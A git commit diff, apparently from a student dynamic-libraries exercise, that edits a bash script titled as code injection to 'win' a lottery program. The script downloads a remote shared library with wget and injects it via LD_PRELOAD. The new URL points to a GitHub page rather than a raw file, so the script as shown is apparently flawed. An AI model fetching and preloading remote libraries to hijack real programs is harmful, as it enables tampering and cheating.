2c6ac849198fc85decabed21a2c8d189c375b52c
Douglous Sobei <douglousmangoyi@gmail.com>
2022-12-14 03:03:51 +0300

    Code injection: Win the Giga Millions!

--- 0x18-dynamic_libraries/101-make_me_win.sh
+++ 0x18-dynamic_libraries/101-make_me_win.sh
@@ -1,3 +1,3 @@
 #!/bin/bash
-wget -O /tmp/win.so https://github.com/Zevrov/holbertonschool-low_level_programming/raw/master/0x17-dynamic_libraries/win.so
-export LD_PRELOAD=/tmp/win.so
+wget -O win.so https://github.com/Douglous-Sobei/alx-low_level_programming/tree/main/0x18-dynamic_libraries/win.so
+export LD_PRELOAD=win.so
